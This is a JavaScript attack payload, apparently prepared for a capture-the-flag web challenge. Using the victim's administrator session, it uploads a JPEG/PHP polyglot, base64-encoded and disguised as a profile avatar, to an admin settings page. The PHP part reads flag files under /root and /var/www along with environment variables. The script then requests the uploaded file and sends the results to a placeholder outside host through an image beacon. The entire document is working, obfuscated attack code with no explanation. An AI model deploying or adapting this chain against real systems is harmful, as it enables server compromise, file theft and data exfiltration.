(()=>{
  const guard='__LOCAL_GUARD__';
  if(localStorage.getItem(guard)) return;
  localStorage.setItem(guard,'started');

  const raw=atob('/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAABAAEDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwBlFFFekfm5/9k8P3BocAokY2FuZGlkYXRlcyA9IGFycmF5KCk7CiRlbnZGbGFnID0gZ2V0ZW52KCdGTEFHJyk7CiRlbnZXZWJ2ZXJzZSA9IGdldGVudignV0VCVkVSU0VfRkxBRycpOwppZiAoJGVudkZsYWcgIT09IGZhbHNlKSAkY2FuZGlkYXRlc1tdID0gJGVudkZsYWc7CmlmICgkZW52V2VidmVyc2UgIT09IGZhbHNlKSAkY2FuZGlkYXRlc1tdID0gJGVudldlYnZlcnNlOwoKJHBhdGhzID0gYXJyYXkoCiAgJy9mbGFnJywKICAnL2ZsYWcudHh0JywKICAnL3Jvb3QvZmxhZy50eHQnLAogICcvdmFyL3d3dy9mbGFnJywKICAnL3Zhci93d3cvZmxhZy50eHQnLAogICcvdmFyL3d3dy9odG1sL2ZsYWcnLAogICcvdmFyL3d3dy9odG1sL2ZsYWcudHh0JywKICAnL3Zhci93d3cvaHRtbC9hZG1pbi9mbGFnLnR4dCcKKTsKCmZvcmVhY2ggKCRwYXRocyBhcyAkcGF0aCkgewogIGlmIChpc19yZWFkYWJsZSgkcGF0aCkpIHsKICAgICR2YWx1ZSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRwYXRoKTsKICAgIGlmICgkdmFsdWUgIT09IGZhbHNlKSAkY2FuZGlkYXRlc1tdID0gJHZhbHVlOwogIH0KfQoKZm9yZWFjaCAoJGNhbmRpZGF0ZXMgYXMgJHZhbHVlKSB7CiAgaWYgKHByZWdfbWF0Y2goJy9XRUJWRVJTRVx7W159XStcfS8nLCAkdmFsdWUsICRtYXRjaCkpIHsKICAgIGVjaG8gJG1hdGNoWzBdOwogICAgZXhpdDsKICB9Cn0KCmVjaG8gJ05PX0ZMQUcnOwo/Pg==');
  const bytes=new Uint8Array(raw.length);
  for(let i=0;i<raw.length;i++) bytes[i]=raw.charCodeAt(i);

  const form=new FormData();
  form.append(
    'avatar',
    new Blob([bytes],{type:'image/jpeg'}),
    '__UPLOAD_NAME__'
  );

  fetch('/admin/settings.php?action=avatar',{
    method:'POST',
    body:form,
    credentials:'include'
  })
  .then(async r=>{
    const html=await r.text();
    const doc=new DOMParser().parseFromString(html,'text/html');
    const current=doc.querySelector('img[alt="Current profile picture"]');
    const currentSrc=current ? current.getAttribute('src') : '';
    const paths=[
      currentSrc,
      '/uploads/avatars/__UPLOAD_NAME__'
    ].filter(Boolean);

    let flag=null;
    let source='';
    let probes='';

    for(const path of [...new Set(paths)]){
      try{
        const rr=await fetch(path,{
          credentials:'include',
          cache:'no-store'
        });
        probes+=path+':'+rr.status+';';
        const body=await rr.text();
        const match=body.match(/WEBVERSE\{[^}]+\}/);
        if(match){
          flag=match[0];
          source=path;
          break;
        }
      }catch(e){
        probes+=path+':ERR;';
      }
    }

    const query=flag
      ? 'status=FLAG&flag='+encodeURIComponent(flag)+
        '&source='+encodeURIComponent(source)
      : 'status=NO_FLAG&upload_status='+r.status+
        '&current='+encodeURIComponent(currentSrc)+
        '&probes='+encodeURIComponent(probes);

    new Image().src=
      'http://__INTERACT_HOST__/__CALLBACK__?' + query;
  })
  .catch(()=>{
    new Image().src=
      'http://__INTERACT_HOST__/__CALLBACK__?status=UPLOAD_ERROR';
  });
})();
